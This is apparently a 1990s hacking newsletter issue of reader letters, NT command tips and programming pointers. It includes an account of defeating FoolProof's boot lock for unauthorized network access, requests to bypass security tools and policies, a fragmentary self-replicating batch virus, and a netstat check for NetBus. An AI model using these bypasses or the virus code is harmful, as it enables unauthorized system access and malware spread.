Opening Comments

Wow.  Things have really slowed down...I haven't been getting 
as many emails regarding subjects for the HHD.  I haven't received 
a single submission or request for the Perl Corner!

I have received emails asking me about changing the login splash 
screen on 98...but I can't answer them.  I don't have 98.  No 
reader has sent me a URL that describes how to do this stuff.  And 
frankly, I am just not interested...if I had a URL, I would 
post it.

Here are some tips for submissions and questions... 
1.  Avoid 'leet skript. 
2.  Don't divulge a lot of personal information...I don't want 
to know that you are a 15 yr old male in Argentina. 
3.  Be clear as to your question or submission. 
4.  DO NOT ask me to teach you to 'hack' or to 'hack' into a system. 
5.  Use correct spelling and grammar. 
6.  If you are going to respond to a Reader Submission, make sure 
that you include the original poster in the To: block.  I am not 
a mail relay service.

From:  "Max Andersen" <unibomber_98@hotmail.com>

Hi. I have some questions for you all. If possible, could you 
publicise  it on the hacker's list, so everyone can read it 
and help me with my queries.

I have Raising.exe, and Handsoff.exe (security programs) 
installed on our computers which are set up by a LAN, and 
I can not get into Windows as a result of losing my password 
and user name.  Also, I can not delete these programs, becuase 
the computers don't check for a floppy disk when it boots up, 
therefore, can not use a boot disk to do what I thought would work. 
Would you please help me with my queries? 
Thank you for your time and support.

they choose...]

From:  "Total DiStortion" <totaldis@flinet.com>

Have a little story to tell ya `bout FoolProof.

My friend was trying to get rid of BootLock (part of 
FoolProofs internal BootLocker) because he wanted to look 
around the network a little without any access, but since he's 
not as skilled as he hoped he actually pulled the master boot 
record off of the drive w/ "fdisk /mbr" so in turn I had to fix 
it before the admin found out.  What I had done was reset the 
Master Boot Record back to normal w/ linux's fdisk, thus giving 
me no bootlock and full access to the system.  Just thought I'd 
let you know so if you would like to put it in a foolproof section 
of some kind your users or "subscribers" could have more ways to 
work around FoolProof. 
        -Total_DiS

[Editor:  Okay...but I see two things happening...either you 
get booted off of the systems for doing things like this, or 
they make you the sysadmin, and make you deal with things like 
this.  Maybe instead of doing things like this you could sort of 
help the sysadmin out and figure out how to prevent such things.]

Subj:  Batch files

Hi. 
I seem to ask a lot from you good people but never contribute 
myself. So, here I am trying to contribute.

I was just reading your turorial on Batch files. I was wondering 
if you would like a copy of my batch file.

It is a Virus, but there is no "payload" and there fore all it 
does is copy it's code to the end of all the batch files in current 
dierctory.

if %1==/find goto virii_find

:virii_start 
REM Will find all batch files in current diectory

REM End of check

echo The virii is now infecting %2 
type %2 > viriix.bat 
find "virii" <%virii%>> viriix.bat

goto virii_end

:virii_end

I don't know what use this could be apart from an example of 
redirecting outputs and "for" commands

From:  TCB <aristeus@uswest.net> 
Subj:  Batch clean

Greetings,

        I've tested this batch file on Windows95 4.00.950B and on 
DOS 6.21 compare the output of this batch with the output produced 
by running 'list.bat' followed by 'clean.pl' from the Feb. 23, 1999 
issue of the HH Digest:

** Usage:  list2 [STARTDIR]  (For C:\ use "list2 C:") ** 
** When the /S AND the /B switches are added to 'dir' ** 
** it gives the full pathname of the file.            ** 
** /S includes subdirectories under [STARTDIR]        ** 
** /B is for 'bare format'(i.e.- no header, no footer)** 
** /L switches output to lowercase(not necessary).    **

-----  begin list2.bat  ----- 
@ECHO OFF 
dir %1\*.com /s /b /l > master2.txt 
dir %1\*.exe /s /b /l >> master2.txt 
dir %1\*.sys /s /b /l >> master2.txt 
-----  end list2.bat  -----

Extremely simple...so much so that I'm glad you didn't solve 
your problem this way, since there was much more to be learned 
in your clean.pl script(Which was a nice piece of work, BTW). 
As I mentioned, I've only tested this on 95B and DOS 6.21, 
so if it doesn't produce the correct resultant file, please 
let me know which version of Windows you are running.

Sincerely, 
        -TCB.

Subj:  poledit

I was wondering if there is anyway to get by policies set by 
poledit.  for example say registry editing is disabled, is 
there anyway to run regedit although this policy is set. I've 
tried running it throguh IE ,  but no luck. 
Any help would be appreciated 
thanx

Subj:  Question about IP address

I have been reading the HH Digest for quite some time and I 
have a question.  Recently I have come across several URLs 
with an address format that I haven't seen before.  I would 
like to know what it is called, and how it is derived from a 
domain name or IP number.  For example the following url 
http://3505003744/ turns out to be 
http://208.234.28.224/ which is 
http://www.srointernet.com/  Thanks.

[Editor:  Okay, on this one, please include me in the CC: 
block when you answer Chuck.  I've never seen the address 
he describes, but it works...]

****************************************************************** 
Useful NT Commands

Believe it or NoT (hee hee), NT has some pretty usefull commands 
that behave in much the same way as similar commands on Unix. 
We'll take a look at a few of the commands...and keep in mind 
that there is no substitute for your own experimentation.  Most 
of these commands are command line tools, which means that they 
can be placed in batch files, used in Perl scripts, and you can 
get information on their usage by typing '/?' following the 
command.  Also, if you choose Start -> Help -> Contents -> 
Windows NT Commands, you will see a listing of the various 
commands available, with explanations and examples. 
 

call 
This command is used to call one batch file from another (wow, 
that's exactly what it says in the Help!!).  Keep in mind that 
the file called must have a .bat or .cmd extension.  You can use 
this in a conditional check batch file...if one condition is 
met, call another batch file...

Filter commands (find, more, sort) 
These commands work in a manner similar to the way they work on 
Unix.  An example of the use of 'find' can be seen in a previous 
edition of the HHD...we wanted to use netstat to see if NetBus or 
BO were installed on our system, so we used the following command:

netstat -a | find "12345"

This command pipes the output of 'netstat -a' through the filter 
command 'find', looking for the string '12345'.  If we get a 
response from the command, then we might have NetBus installed on 
our system!

findstr 
This command is similar to grep, found on Unix systems.  There 
are far too many switches for this command to be listed here... 
read through your online Help to see what they are.  You can use 
this command to search for all instances of a particular string 
of characters in a file, or a series of files.  Findstr even 
responds to the wildcard, so you can choose '*.txt' or '*' as 
the files to search.  You can even recurse subdirectories using 
the '/s' switch.  Note:  If you want to find the number of times 
a string appears in a file, then use the 'find' command, with the 
'/c' switch.

xcopy 
If you want to copy a large number of files, such as entire 
directories, from one location to another, take a look at xcopy.

pax 
If you administrate a heterogenous environment (ie, NT and Unix) 
then you might consider the pax command.  It's used to read and 
write archive files which conform to the Archive/Interchange File 
Format specified in IEEE Std. 1003.1-1988.  What does all that 
mean?  Well, according to the documentation, pax supports V7 tar 
and System V binary cpio format archives.

mem 
Displays information about allocated memory areas.

pentnt 
Checks your processor to see if you have the Intel floating 
point bug.

start 
Creates a separate window to run a program.  This is usefull if 
you want to run a command, but you don't want to open a separate 
command prompt to do so.

Next time, we'll take a look at some of the networking commands.

'Hacking Win9x'

With all the email about modifying this or that on Win9x, I 
wanted to pass on this site...check out WinTrasher Gold.  From 
the write-up, it sounds pretty good...

****************************************************************** 
Hacking Philes

While visiting one of the sites that I visit regularly, I ran 
across a couple of very interesting files that are definitely 
worth the time it takes to read them.  They are from Eric 
Raymond (URLs wrap...):

http://www.genocide2600.com/~tattooman/hacking-textfiles/ 
hacker-howto.html

anatomy.of.attack.txt

****************************************************************** 
Linux and Win9x

Okay, I know that this is supposed to be the Windows HHD, but I 
have been getting email asking me about Linux this, Linux that, 
and what kind of Unix you can run with 95, blah, blah, blah. 
If those of you who are sending me these emails REALLY have been 
reading the Digests for as long as you say...well, keep reading! 
I thought I would pull together a couple of quick resources, 
so that you can now pester the Unix editor instead of me!!

In order to learn how to do anything with Linux, the best place 
to start is with the Linux Documentation Project...which is really 
easy to find if you start at Yahoo!  The LDP maintains a list of 
HOWTOs, which tell you 'how to' do a lot of things with Linux. 
If you are especially interested in running Win95 and Linux, check 
out the two mini-HOWTOs:

Linux+Win95 mini-HOWTO

and

Loadlin+Win95 mini-HOWTO

I offer no review, nor do I guarantee your success with them.  I 
am only offering them up as resources.

Now, if you are interested in running Win95 and Linux, but you 
don't want to bother with repartitioning your hard drive (REAL 
men repartition!!), then check out:

http://www.slackware.com/zipslack

I won't say any more...other than this...if you want to use 
Linux on the Internet, you'll probably have to install PPP from 
the 'Packages' section.

Here's my challenge...I'd like to see a couple of readers go 
ahead and set up their systems using ZipSlack.  Install PPP and 
X-Windows, and whatever else.  Clearly document every step _exactly_ 
as you set up ZipSlack, and put it all on a web page when you're 
done.  Then send me the URL, so I will post it here in the HHD.

If you choose to try and install ZipSlack, or any other Linux, don't 
contact me for help.  I won't have it.  But if you do get it 
installed, put the steps on a web page, and send me the URL.

Of course, this is in addition to all previous references to 
Trinux...http://www.trinux.org.

****************************************************************** 
TCL/Tk Programming

You're probably asking yourself...why is another programming or 
scripting language being introduced in the Windows edition of the 
HHD?  Okay, I'll reiterate the old adages of helping you to help 
yourself, blah, blah, blah.  But here's another reason...TCL and 
Perl come with Linux for free, and are originally from the Unix 
platform.  So if you learn a little bit about either of the 
languages on Win32, you can not only increase your knowledge of 
Win32 systems, but you can also prepare yourself for Linux and 
Unix-based systems.  If you write your scripts, and provide 
comments such as 'this is how it's done on Win32, and here's how 
it's done on Linux', you will not only have cross-platform tools, 
but you'll have skills and knowledge that you can carry over to 
other platforms.

What is TCL/Tk?  Well, TCL stands for 'tool command language' and 
was originally written to standardize the command language used 
in a research project.  In my endeavor to learn more about this 
little gem, and to see if it runs on Win32 systems, such as 95 
and NT, I started my search at...Yahoo!  For information on the 
history of TCL, right from the creater, John Ousterhout, check 
out: 
http://www.scriptics.com/scripting/tclHistory.html

NOTE:  The Scriptics site also has a wealth of information 
regarding TCL...introduction to programming, a style guide, 
white papers, man pages, etc.  If you need a tutorial, 
check out: 
http://www.msen.com/~clif/TclTutor.html

I quickly found out that Scriptics (http://www.scriptics.com/) 
has the downloadable binaries for Win32 systems...for free! 
http://www.scriptics.com/software/8.0.html#Download Binary

Installation is a snap.  You may choose to install the binaries 
into a directory other than the default of 'c:\program files\ 
tcl'...I chose 'c:\Tcl'.

For lots of info, check out: 
http://www.sco.com/Technology/tcl/Tcl.html

Here's a FAQ for TCL/Tk on Windows: 
http://www.pconline.com/~erc/tclwin.htm

Use TCL/Tk for web programming: 
http://wwwwseast2.usec.sun.com/960710/cover/index.html

Here's an interesting little script that was sent to me, 
one that prompted me to look into TCL/Tk...imagine 
that, a reader submission!!

Assuming that you installed TCL in the directory 'c:\tcl', 
you can run the above script by adding the line:

#! c:\tcl\bin\wish80.exe

...to the very beginning of the script...it MUST be the first 
line of the script.  Once you save the script as 'test.tcl', 
just type:

test.tcl

at the command prompt.  Then a nice GUI window opens up!
